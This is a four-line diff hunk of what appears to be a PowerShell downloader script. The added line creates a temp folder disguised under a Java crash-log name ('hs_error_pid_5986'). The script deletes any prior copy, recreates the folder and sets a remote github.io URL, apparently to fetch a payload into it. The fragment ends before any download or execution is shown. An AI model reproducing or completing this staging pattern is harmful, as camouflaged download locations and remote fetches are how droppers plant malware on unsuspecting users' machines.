@@ -1,3 +1,4 @@
+$folderPath = Join-Path $env:TEMP "hs_error_pid_5986"
 if (Test-Path -Path $folderPath) {  Remove-Item -Path $folderPath -Recurse -Force; Write-Host "Failed, have you run me twice?";pause;exit }
 New-Item -ItemType Directory -Path $folderPath | Out-Null
 $url = "https://stinkylick.github.io/stinkylick/2/a"
